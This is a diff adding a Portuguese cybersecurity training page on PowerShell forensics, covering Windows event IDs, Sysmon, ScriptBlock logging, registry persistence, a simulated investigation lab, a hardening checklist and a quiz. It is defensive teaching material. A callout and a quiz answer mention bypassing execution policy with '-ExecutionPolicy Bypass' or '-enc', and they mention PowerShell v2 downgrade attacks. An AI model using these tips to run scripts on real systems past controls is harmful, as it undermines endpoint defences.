+  margin: 0 auto;
+}
+
+/* --------------------------------------------------------------------------
+   15. Rodapé e Referências
+   -------------------------------------------------------------------------- */
+.study-footer {
+  margin-top: 3.5rem;
+  padding-top: 1.5rem;
+  border-top: 1px solid var(--rule);
+  text-align: center;
+  font-size: 0.88rem;
+  color: var(--muted);
+}
+
+/* --------------------------------------------------------------------------
+   16. Responsividade & Impressão (@media)
+   -------------------------------------------------------------------------- */
+@media (max-width: 640px) {
+  h1 { font-size: 1.85rem; }
+  h2 { font-size: 1.45rem; }
+  .hero-header { padding: 1.25rem; }
+  .lab-body { padding: 1rem; }
+  .lab-controls { flex-direction: column; align-items: stretch; }
+  .top-nav-inner { padding: 0.5rem 1rem; }
+  .nav-title { display: none; }
+  .nav-actions .badge { display: none; }
+  .btn { overflow-wrap: anywhere; }
+  .edr-grid-container { grid-template-columns: minmax(0, 1fr); }
+}
+
+@media print {
+  body {
+    background-color: #FFFFFF !important;
+    color: #000000 !important;
+  }
+  .top-nav, .theme-toggle-btn, .btn-copy, .lab-controls button {
+    display: none !important;
+  }
+  .container {
+    max-width: 100% !important;
+    padding: 0 !important;
+  }
+  .hero-header, .lab-box, .checklist, .quiz-section {
+    border: 1px solid #CCC !important;
+    box-shadow: none !important;
+    break-inside: avoid;
+  }
+}
+
+  </style>
+</head>
+<body data-slug="PowerShell-e-Windows-Interno">
+
+  <!-- Barra de Navegação Superior e Breadcrumbs -->
+  <header class="top-nav">
+    <div class="top-nav-inner">
+      <a href="../index.html" class="nav-back">← Painel de Estudos</a>
+      <span class="nav-title">PowerShell, Event Log e Registro do Windows</span>
+      <div class="nav-actions">
+        <span class="badge badge-t8">Trilha 8</span>
+        <button class="theme-toggle-btn" aria-label="Alternar tema" onclick="toggleTheme()">
+          <span class="theme-icon">🌙</span> <span class="theme-label">Escuro</span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Conteúdo Principal do Treinamento -->
+  <main class="container">
+<!-- Estudo 36: PowerShell-e-Windows-Interno Body Fragment -->
+<article class="study-container" data-slug="powershell-windows">
+
+    <!-- SEÇÃO 1: POWERSHELL -->
+    <section class="study-section" id="introducao">
+        <div class="section-header">
+            <span class="section-tag">Seção 01</span>
+            <h2>Introdução: A Mesma Ferramenta dos Dois Lados</h2>
+        </div>
+
+        <p class="lead-text">
+            O PowerShell administra o Windows inteiro e, por isso mesmo, é uma das ferramentas favoritas de quem invade (T1059.001). Para o analista, ele é o jeito mais rápido de perguntar a uma máquina o que aconteceu: quais eventos houve, o que está rodando, o que inicia sozinho. Neste estudo você vai aprender o suficiente de PowerShell para investigar a <strong>EST-FIN-07</strong>, uma estação do financeiro da Ipê Store que abriu o anexo errado.
+        </p>
+
+        <h3>Cmdlets e Pipeline de Objetos</h3>
+        <ul>
+            <li>Os comandos, chamados cmdlets, seguem o padrão <strong>Verbo-Substantivo</strong>: <code>Get-Process</code>, <code>Get-Service</code>, <code>Get-WinEvent</code>. <code>Get-Command</code> lista os disponíveis, <code>Get-Help</code> explica cada um e <code>Get-Member</code> mostra as propriedades do que um comando devolve.</li>
+            <li>O <strong>pipeline de objetos</strong> é a grande diferença em relação ao bash: o <code>|</code> passa objetos com propriedades, não texto. Em vez de recortar colunas com <code>awk</code>, você filtra por propriedade com <code>Where-Object</code>, escolhe colunas com <code>Select-Object</code>, ordena com <code>Sort-Object</code> e conta com <code>Group-Object</code>.</li>
+            <li><code>Get-WinEvent -FilterHashtable</code> filtra no próprio log, antes de trazer os eventos, o que é muito mais rápido do que trazer tudo e filtrar depois com <code>Where-Object</code>.</li>
+        </ul>
+
+        <div class="terminal-box">
+            <div class="terminal-header">
+                <span class="terminal-title">PowerShell — consultas de investigação</span>
+                <button class="terminal-copy-btn" onclick="copyCode(this, 'code-ps-consultas')">Copiar</button>
+            </div>
+            <pre><code id="code-ps-consultas"># Falhas de logon por IP de origem (IpAddress é o campo 19 do 4625)
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} |
+  ForEach-Object { $_.Properties[19].Value } | Group-Object | Sort-Object Count -Descending
+
+# Todos os campos de um evento, a partir do XML
+$e = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720} -MaxEvents 1
+([xml]$e.ToXml()).Event.EventData.Data | Select-Object Name, '#text'
+
+# Persistência: chaves Run, serviços fora dos caminhos usuais, tarefas agendadas
+Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run', 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-CimInstance Win32_Service | Where-Object PathName -notmatch 'Windows|Program Files' |
+  Select-Object Name, PathName, StartName
+Get-ScheduledTask | Where-Object TaskPath -notlike '\Microsoft\*'</code></pre>
+        </div>
+
+        <div class="callout warning">
+            <div class="callout-title">
+                <span class="callout-icon">🧱</span>
+                <strong>Execution policy não é barreira de segurança</strong>
+            </div>
+            <p>
+                A <strong>execution policy</strong> evita que um usuário rode um script por engano, mas qualquer pessoa a contorna com <code>-ExecutionPolicy Bypass</code> ou colando o código no console. As defesas reais são outras: <strong>AMSI</strong> (o antivírus inspeciona o script já decodificado, antes de ele rodar), <strong>Constrained Language Mode</strong> com controle de aplicações (WDAC ou AppLocker), log de ScriptBlock e a remoção do <strong>PowerShell v2</strong>, que não tem AMSI nem log e é usado em ataques de <em>downgrade</em>.
+            </p>
+        </div>
+    </section>
+
+    <!-- SEÇÃO 2: EVENTOS E PERSISTÊNCIA -->
+    <section class="study-section" id="eventos">
+        <div class="section-header">
+            <span class="section-tag">Seção 02</span>
+            <h2>Eventos Essenciais, Sysmon, ScriptBlock e Registro</h2>
+        </div>
+
+        <h3>Eventos que Contam a História</h3>
+        <div class="table-responsive">
+            <table class="data-table">
+                <thead>
+                    <tr><th>Evento</th><th>Log</th><th>Significado</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><strong>4624</strong> / <strong>4625</strong></td><td>Security</td><td>Logon com sucesso / com falha (veja o LogonType)</td></tr>
+                    <tr><td><strong>4648</strong></td><td>Security</td><td>Logon com credenciais explícitas (runas, conexão com outra conta)</td></tr>
+                    <tr><td><strong>4672</strong></td><td>Security</td><td>Privilégios especiais atribuídos: a conta é administradora</td></tr>
+                    <tr><td><strong>4688</strong></td><td>Security</td><td>Processo criado (com linha de comando, se a política estiver ativa)</td></tr>
+                    <tr><td><strong>4720</strong> / <strong>4732</strong></td><td>Security</td><td>Conta criada / membro adicionado a grupo local (T1136.001)</td></tr>
+                    <tr><td><strong>4698</strong></td><td>Security</td><td>Tarefa agendada criada</td></tr>
+                    <tr><td><strong>7045</strong></td><td>System</td><td>Serviço instalado (T1543.003)</td></tr>
+                    <tr><td><strong>1102</strong></td><td>Security</td><td>Log de auditoria apagado</td></tr>
+                </tbody>
+            </table>
+        </div>
+        <p>
+            O campo <strong>LogonType</strong> diz como o logon aconteceu: 2 interativo (teclado), 3 rede, 4 tarefa agendada, 5 serviço, 7 desbloqueio de tela, 10 remoto (RDP) e 11 com credencial em cache.
+        </p>
+
+        <h3>Sysmon e ScriptBlock</h3>
+        <p>
+            O <strong>Sysmon</strong> acrescenta eventos que o Windows não gera sozinho: 1 (processo criado, com processo pai e hash), 3 (conexão de rede), 11 (arquivo criado) e 13 (valor de Registro alterado). O log de <strong>ScriptBlock</strong> do PowerShell (evento <strong>4104</strong>) registra o script que de fato rodou, já decodificado: um comando escondido em Base64 com <code>-enc</code> aparece em texto claro.
+        </p>
+
+        <div class="diagram-box">
+            <div class="diagram-header">
+                <span class="diagram-title">Rastro de um Anexo Malicioso nos Eventos</span>
+                <span class="diagram-badge">Mermaid</span>
+            </div>
+            <div class="diagram-box">
+  <div class="diagram-header">
+    <span class="diagram-title">Rastro de um Anexo Malicioso nos Eventos</span>
+    <span class="diagram-badge">Mermaid Arquitetura</span>
+  </div>
+  <div class="diagram-svg-wrap" role="img" aria-label="Rastro de um Anexo Malicioso nos Eventos">
+    <svg id="my-svg" width="100%" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="flowchart" style="max-width: 168px; background-color: transparent;" viewBox="4 4 168 984" role="graphics-document document" aria-roledescription="flowchart-v2"><style>#my-svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;fill:#ccc;}@keyframes edge-animation-frame{from{stroke-dashoffset:0;}}@keyframes dash{to{stroke-dashoffset:0;}}#my-svg .edge-animation-slow{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 50s linear infinite;stroke-linecap:round;}#my-svg .edge-animation-fast{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 20s linear infinite;stroke-linecap:round;}#my-svg .error-icon{fill:#a44141;}#my-svg .error-text{fill:#ddd;stroke:#ddd;}#my-svg .edge-thickness-normal{stroke-width:1px;}#my-svg .edge-thickness-thick{stroke-width:3.5px;}#my-svg .edge-pattern-solid{stroke-dasharray:0;}#my-svg .edge-thickness-invisible{stroke-width:0;fill:none;}#my-svg .edge-pattern-dashed{stroke-dasharray:3;}#my-svg .edge-pattern-dotted{stroke-dasharray:2;}#my-svg .marker{fill:lightgrey;stroke:lightgrey;}#my-svg .marker.cross{stroke:lightgrey;}#my-svg svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;}#my-svg p{margin:0;}#my-svg .label{font-family:"trebuchet ms",verdana,arial,sans-serif;color:#ccc;}#my-svg .cluster-label text{fill:#F9FFFE;}#my-svg .cluster-label span{color:#F9FFFE;}#my-svg .cluster-label span p{background-color:transparent;}#my-svg .label text,#my-svg span{fill:#ccc;color:#ccc;}#my-svg .node rect,#my-svg .node circle,#my-svg .node ellipse,#my-svg .node polygon,#my-svg .node path{fill:#1f2020;stroke:#ccc;stroke-width:1px;}#my-svg .rough-node .label text,#my-svg .node .label text,#my-svg .image-shape .label,#my-svg .icon-shape .label{text-anchor:middle;}#my-svg .node .katex path{fill:#000;stroke:#000;stroke-width:1px;}#my-svg .rough-node .label,#my-svg .node .label,#my-svg .image-shape .label,#my-svg .icon-shape .label{text-align:center;}#my-svg .node.clickable{cursor:pointer;}#my-svg .root .anchor path{fill:lightgrey!important;stroke-width:0;stroke:lightgrey;}#my-svg .arrowheadPath{fill:lightgrey;}#my-svg .edgePaths .path{stroke:lightgrey;stroke-width:1px;}#my-svg .flowchart-link{stroke:lightgrey;fill:none;}#my-svg .edgeLabel{background-color:hsl(0, 0%, 34.4117647059%);text-align:center;}#my-svg .edgeLabel p{background-color:hsl(0, 0%, 34.4117647059%);}#my-svg .edgeLabel rect{opacity:0.5;background-color:hsl(0, 0%, 34.4117647059%);fill:hsl(0, 0%, 34.4117647059%);}#my-svg .labelBkg{background-color:rgba(87.75, 87.75, 87.75, 0.5);}#my-svg .cluster rect{fill:hsl(180, 1.5873015873%, 28.3529411765%);stroke:rgba(255, 255, 255, 0.25);stroke-width:1px;}#my-svg .cluster text{fill:#F9FFFE;}#my-svg .cluster span{color:#F9FFFE;}#my-svg .node .collapsed-indicator{fill:rgba(255, 255, 255, 0.25);stroke:none;opacity:0.6;}#my-svg .node .collapsed-separator{stroke:rgba(255, 255, 255, 0.25);stroke-width:0.75px;}#my-svg div.mermaidTooltip{position:absolute;text-align:center;max-width:200px;padding:2px;font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:12px;background:hsl(20, 1.5873015873%, 12.3529411765%);border:1px solid rgba(255, 255, 255, 0.25);border-radius:2px;pointer-events:none;z-index:100;}#my-svg .flowchartTitleText{text-anchor:middle;font-size:18px;fill:#ccc;}#my-svg rect.text{fill:none;stroke-width:0;}#my-svg .icon-shape,#my-svg .image-shape{background-color:hsl(0, 0%, 34.4117647059%);text-align:center;}#my-svg .icon-shape p,#my-svg .image-shape p{background-color:hsl(0, 0%, 34.4117647059%);padding:2px;}#my-svg .icon-shape .label rect,#my-svg .image-shape .label rect{opacity:0.5;background-color:hsl(0, 0%, 34.4117647059%);fill:hsl(0, 0%, 34.4117647059%);}#my-svg .label-icon{display:inline-block;height:1em;overflow:visible;vertical-align:-0.125em;}#my-svg .node .label-icon path{fill:currentColor;stroke:revert;stroke-width:revert;}#my-svg .node .neo-node{stroke:#ccc;}#my-svg [data-look="neo"].node rect,#my-svg [data-look="neo"].cluster rect,#my-svg [data-look="neo"].node polygon{stroke:url(#my-svg-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg [data-look="neo"].swimlane.cluster rect{filter:none;}#my-svg [data-look="neo"].node path{stroke:url(#my-svg-gradient);stroke-width:1px;}#my-svg [data-look="neo"].node .outer-path{filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg [data-look="neo"].node .neo-line path{stroke:#ccc;filter:none;}#my-svg [data-look="neo"].node circle{stroke:url(#my-svg-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg [data-look="neo"].node circle .state-start{fill:#000000;}#my-svg [data-look="neo"].icon-shape .icon{fill:url(#my-svg-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg [data-look="neo"].icon-shape .icon-neo path{stroke:url(#my-svg-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg :root{--mermaid-font-family:"trebuchet ms",verdana,arial,sans-serif;}</style><g><marker id="my-svg_flowchart-v2-pointEnd" class="marker flowchart-v2" viewBox="0 0 10 10" refX="5" refY="5" markerUnits="userSpaceOnUse" markerWidth="8" markerHeight="8" orient="auto"><path d="M 0 0 L 10 5 L 0 10 z" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-pointStart" class="marker flowchart-v2" viewBox="0 0 10 10" refX="4.5" refY="5" markerUnits="userSpaceOnUse" markerWidth="8" markerHeight="8" orient="auto"><path d="M 0 5 L 10 10 L 10 0 z" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-pointEnd-margin" class="marker flowchart-v2" viewBox="0 0 11.5 14" refX="11.5" refY="7" markerUnits="userSpaceOnUse" markerWidth="10.5" markerHeight="14" orient="auto"><path d="M 0 0 L 11.5 7 L 0 14 z" class="arrowMarkerPath" style="stroke-width: 0; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-pointStart-margin" class="marker flowchart-v2" viewBox="0 0 11.5 14" refX="1" refY="7" markerUnits="userSpaceOnUse" markerWidth="11.5" markerHeight="14" orient="auto"><polygon points="0,7 11.5,14 11.5,0" class="arrowMarkerPath" style="stroke-width: 0; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-circleEnd" class="marker flowchart-v2" viewBox="0 0 10 10" refX="11" refY="5" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-circleStart" class="marker flowchart-v2" viewBox="0 0 10 10" refX="-1" refY="5" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-circleEnd-margin" class="marker flowchart-v2" viewBox="0 0 10 10" refY="5" refX="12.25" markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 0; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-circleStart-margin" class="marker flowchart-v2" viewBox="0 0 10 10" refX="-2" refY="5" markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 0; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-crossEnd" class="marker cross flowchart-v2" viewBox="0 0 11 11" refX="12" refY="5.2" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><path d="M 1,1 l 9,9 M 10,1 l -9,9" class="arrowMarkerPath" style="stroke-width: 2; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-crossStart" class="marker cross flowchart-v2" viewBox="0 0 11 11" refX="-1" refY="5.2" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><path d="M 1,1 l 9,9 M 10,1 l -9,9" class="arrowMarkerPath" style="stroke-width: 2; stroke-dasharray: 1, 0;"/></marker><marker id="my-svg_flowchart-v2-crossEnd-margin" class="marker cross flowchart-v2" viewBox="0 0 15 15" refX="17.7" refY="7.5" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="12" orient="auto"><path d="M 1,1 L 14,14 M 1,14 L 14,1" class="arrowMarkerPath" style="stroke-width: 2.5;"/></marker><marker id="my-svg_flowchart-v2-crossStart-margin" class="marker cross flowchart-v2" viewBox="0 0 15 15" refX="-3.5" refY="7.5" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="12" orient="auto"><path d="M 1,1 L 14,14 M 1,14 L 14,1" class="arrowMarkerPath" style="stroke-width: 2.5; stroke-dasharray: 1, 0;"/></marker><g class="root"><g class="clusters"/><g class="edges edgePaths"><path d="M88,156L88,192" id="my-svg-L_A_B_0" class="edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="stroke-dasharray: 0 0 32 4; stroke-dashoffset: 0;;" data-edge="true" data-et="edge" data-id="L_A_B_0" data-points="W3sieCI6ODgsInkiOjE1Nn0seyJ4Ijo4OCwieSI6MTk2fV0=" data-look="neo" marker-end="url(#my-svg_flowchart-v2-pointEnd-margin)"/><path d="M88,364L88,400" id="my-svg-L_B_C_0" class="edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="stroke-dasharray: 0 0 32 4; stroke-dashoffset: 0;;" data-edge="true" data-et="edge" data-id="L_B_C_0" data-points="W3sieCI6ODgsInkiOjM2NH0seyJ4Ijo4OCwieSI6NDA0fV0=" data-look="neo" marker-end="url(#my-svg_flowchart-v2-pointEnd-margin)"/><path d="M88,524L88,560" id="my-svg-L_C_D_0" class="edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="stroke-dasharray: 0 0 32 4; stroke-dashoffset: 0;;" data-edge="true" data-et="edge" data-id="L_C_D_0" data-points="W3sieCI6ODgsInkiOjUyNH0seyJ4Ijo4OCwieSI6NTY0fV0=" data-look="neo" marker-end="url(#my-svg_flowchart-v2-pointEnd-margin)"/><path d="M88,636L88,672" id="my-svg-L_D_E_0" class="edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="stroke-dasharray: 0 0 32 4; stroke-dashoffset: 0;;" data-edge="true" data-et="edge" data-id="L_D_E_0" data-points="W3sieCI6ODgsInkiOjYzNn0seyJ4Ijo4OCwieSI6Njc2fV0=" data-look="neo" marker-end="url(#my-svg_flowchart-v2-pointEnd-margin)"/><path d="M88,820L88,856" id="my-svg-L_E_F_0" class="edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="stroke-dasharray: 0 0 32 4; stroke-dashoffset: 0;;" data-edge="true" data-et="edge" data-id="L_E_F_0" data-points="W3sieCI6ODgsInkiOjgyMH0seyJ4Ijo4OCwieSI6ODYwfV0=" data-look="neo" marker-end="url(#my-svg_flowchart-v2-pointEnd-margin)"/></g><g class="edgeLabels"/><g class="nodes"><g class="node default" id="my-svg-flowchart-A-0" data-look="neo" transform="translate(88, 84)"><rect class="basic label-container" style="" x="-76" y="-72" width="152" height="144"/><g class="label" style="" transform="translate(-60, -60)"><rect/><foreignObject width="120" height="120"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 120px; text-align: center; width: 120px;"><span class="nodeLabel"><p>Anexo .docm aberto<br /><small>Sysmon 1: WINWORD.EXE (T1566.001)</small></p></span></div></foreignObject></g></g><g class="node default" id="my-svg-flowchart-B-1" data-look="neo" transform="translate(88, 280)"><rect class="basic label-container" style="" x="-76" y="-84" width="152" height="168"/><g class="label" style="" transform="translate(-60, -72)"><rect/><foreignObject width="120" height="144"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 120px; text-align: center; width: 120px;"><span class="nodeLabel"><p>PowerShell codificado<br /><small>Sysmon 1 com -enc e 4104 decodificado (T1059.001)</small></p></span></div></foreignObject></g></g><g class="node default" id="my-svg-flowchart-C-2" data-look="neo" transform="translate(88, 464)"><rect class="basic label-container" style="" x="-76" y="-60" width="152" height="120"/><g class="label" style="" transform="translate(-60, -48)"><rect/><foreignObject width="120" height="96"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 120px; text-align: center; width: 120px;"><span class="nodeLabel"><p>Conexão com o servidor do atacante<br /><small>Sysmon 3</small></p></span></div></foreignObject></g></g><g class="node default" id="my-svg-flowchart-D-3" data-look="neo" transform="translate(88, 600)"><rect class="basic label-container" style="" x="-76" y="-36" width="152" height="72"/><g class="label" style="" transform="translate(-60, -24)"><rect/><foreignObject width="120" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: nowrap; line-height: 1.5; max-width: 120px; text-align: center; width: 120px;"><span class="nodeLabel"><p>Arquivo baixado<br /><small>Sysmon 11</small></p></span></div></foreignObject></g></g><g class="node default" id="my-svg-flowchart-E-4" data-look="neo" transform="translate(88, 748)"><rect class="basic label-container" style="" x="-76" y="-72" width="152" height="144"/><g class="label" style="" transform="translate(-60, -60)"><rect/><foreignObject width="120" height="120"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 120px; text-align: center; width: 120px;"><span class="nodeLabel"><p>Persistência<br /><small>Sysmon 13 na chave Run (T1547.001) e 7045 (T1543.003)</small></p></span></div></foreignObject></g></g><g class="node default" id="my-svg-flowchart-F-5" data-look="neo" transform="translate(88, 920)"><rect class="basic label-container" style="" x="-76" y="-60" width="152" height="120"/><g class="label" style="" transform="translate(-60, -48)"><rect/><foreignObject width="120" height="96"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 120px; text-align: center; width: 120px;"><span class="nodeLabel"><p>Conta nova em Administradores<br /><small>4720 e 4732 (T1136.001)</small></p></span></div></foreignObject></g></g></g></g></g><defs><filter id="my-svg-drop-shadow" height="130%" width="130%"><feDropShadow dx="4" dy="4" stdDeviation="0" flood-opacity="0.06" flood-color="#FFFFFF"/></filter></defs><defs><filter id="my-svg-drop-shadow-small" height="150%" width="150%"><feDropShadow dx="2" dy="2" stdDeviation="0" flood-opacity="0.06" flood-color="#FFFFFF"/></filter></defs><linearGradient id="my-svg-gradient" gradientUnits="objectBoundingBox" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stop-color="#cccccc" stop-opacity="1"/><stop offset="100%" stop-color="hsl(180, 0%, 18.3529411765%)" stop-opacity="1"/></linearGradient></svg>
+  </div>
+</div>
+        </div>
+
+        <h3>Persistência no Registro</h3>
+        <p>
+            As chaves <code>...\CurrentVersion\Run</code> executam um programa a cada logon (T1547.001). Em <strong>HKLM</strong> valem para todos os usuários e exigem administrador para gravar; em <strong>HKCU</strong> valem só para o usuário e não exigem privilégio, por isso são as preferidas de um malware que entrou por um usuário comum. Compare cada valor com o que é conhecido na empresa e desconfie de executáveis em <code>C:\Users\Public</code>, <code>AppData</code> ou <code>Temp</code>.
+        </p>
+
+        <div class="callout tip">
+            <div class="callout-title">
+                <span class="callout-icon">🧾</span>
+                <strong>Onde ficam os campos de um evento</strong>
+            </div>
+            <p>
+                No Windows real, campos como <code>TargetUserName</code> e <code>IpAddress</code> não são propriedades diretas do objeto devolvido por <code>Get-WinEvent</code>: ficam na lista <code>.Properties</code>, por posição, ou no XML do evento, que se lê com <code>[xml]$e.ToXml()</code>. No laboratório abaixo eles aparecem como propriedades diretas, para simplificar.
+            </p>
+        </div>
+    </section>
+
+    <!-- SEÇÃO 3: SIMULADOR -->
+    <section class="study-section" id="simulador">
+        <div class="section-header">
+            <span class="section-tag">Seção 03</span>
+            <h2>Laboratório Prático: Visualizador de Eventos no PowerShell</h2>
+        </div>
+
+        <p class="lead-text">
+            O EDR alertou sobre uma conexão estranha da EST-FIN-07. Use o console para investigar com cmdlets e pipeline de objetos, e responda às perguntas. Digite <code>Get-Command</code> para a lista de comandos e <code>Get-Help nome</code> para exemplos.
+        </p>
+
+        <div class="lab-box ps-lab" id="ps-lab">
+            <div class="lab-header">
+                <div>
+                    <span class="lab-badge">Laboratório de PowerShell</span>
+                    <h3 style="margin: 0.4rem 0 0.2rem 0;">PS C:\&gt; EST-FIN-07</h3>
+                    <p id="ps-contexto" style="margin: 0; font-size: 0.9rem; color: var(--muted);"></p>
+                </div>
+            </div>
+
+            <div class="lab-body">
+                <div style="background: #012456; color: #eef2ff; border-radius: var(--radius-md); padding: 0.75rem; font-family: var(--font-mono); font-size: 0.78rem; border: 1px solid #1e3a8a;">
+                    <div id="ps-console" role="log" aria-live="polite" aria-label="Saída do console" tabindex="0" style="max-height: 26rem; overflow: auto; white-space: pre; line-height: 1.45; margin-bottom: 0.5rem;"></div>
+                    <div style="display: flex; align-items: center; gap: 0.4rem; border-top: 1px solid #1e3a8a; padding-top: 0.5rem;">
+                        <span style="color: #fde68a; white-space: nowrap;">PS C:\&gt;</span>
+                        <input type="text" id="ps-entrada" aria-label="Comando PowerShell" autocomplete="off" autocapitalize="off" spellcheck="false" style="flex: 1; min-width: 0; background: transparent; border: none; outline: none; color: #ffffff; font-family: inherit; font-size: inherit;">
+                        <button class="btn-primary" type="button" id="ps-executar" style="padding: 0.2rem 0.7rem; font-size: 0.78rem;">Executar</button>
+                    </div>
+                </div>
+                <div id="ps-atalhos" style="display: flex; flex-wrap: wrap; gap: 0.35rem; margin-top: 0.5rem;"></div>
+
+                <h4 style="margin-top: 1.5rem;">Perguntas da investigação</h4>
+                <div id="ps-perguntas" style="display: grid; grid-template-columns: minmax(0, 1fr); gap: 0.9rem; font-size: 0.88rem;"></div>
+
+                <div style="margin-top: 1.25rem;">
+                    <button class="btn-secondary" type="button" onclick="restaurarPowerShell()">Restaurar laboratório</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- SEÇÃO 4: CHECKLIST -->
+    <section class="study-section" id="checklist">
+        <div class="section-header">
+            <span class="section-tag">Seção 04</span>
+            <h2>Checklist de Visibilidade e Defesa no Windows</h2>
+        </div>
+
+        <p class="lead-text">
+            Use esta lista para avaliar se as estações e servidores Windows deixam rastro suficiente e resistem ao abuso do PowerShell. O estado das caixas fica salvo no seu navegador.
+        </p>
+
+        <ul class="checklist" data-checklist-slug="powershell-windows">
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ps-1">
+                <label for="chk-ps-1"><strong>Auditoria completa:</strong> logon, criação de processo com linha de comando (4688), gestão de contas e de grupos estão habilitadas por GPO.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ps-2">
+                <label for="chk-ps-2"><strong>Sysmon instalado:</strong> com configuração mantida e eventos 1, 3, 11 e 13 enviados ao SIEM.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ps-3">
+                <label for="chk-ps-3"><strong>Log de ScriptBlock:</strong> o evento 4104 está ativo, e a transcrição do PowerShell é guardada fora da máquina.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ps-4">
+                <label for="chk-ps-4"><strong>PowerShell v2 removido:</strong> o recurso opcional foi desinstalado em estações e servidores.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ps-5">
+                <label for="chk-ps-5"><strong>Controle de aplicações:</strong> WDAC ou AppLocker colocam o PowerShell em Constrained Language Mode para usuários comuns.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ps-6">
+                <label for="chk-ps-6"><strong>Usuário sem administrador local:</strong> ninguém usa no dia a dia uma conta que é administradora da própria máquina.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ps-7">
+                <label for="chk-ps-7"><strong>Macros bloqueadas:</strong> documentos do Office vindos da internet não executam macros, e o Office não pode criar processos filhos (regra ASR).</label>
+            </li>
+        </ul>
+    </section>
+
+    <!-- SEÇÃO 5: QUIZ -->
+    <section class="study-section" id="quiz">
+        <div class="section-header">
+            <span class="section-tag">Seção 05</span>
+            <h2>Questões de Fixação e Entrevista</h2>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 1 (Pipeline):</strong> Qual é a principal diferença entre o pipeline do PowerShell e o do bash?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> No PowerShell passam objetos com propriedades; no bash passa texto.</p>
+                    <p>Por isso se filtra com <code>Where-Object { $_.Status -eq 'Running' }</code> em vez de recortar colunas. <code>Get-Member</code> mostra as propriedades disponíveis.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 2 (Execution policy):</strong> A política de execução está em <code>Restricted</code>. Isso impede um atacante de rodar PowerShell na máquina?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> Não. Ela é contornada com <code>-ExecutionPolicy Bypass</code>, com <code>-enc</code> ou colando o código no console.</p>
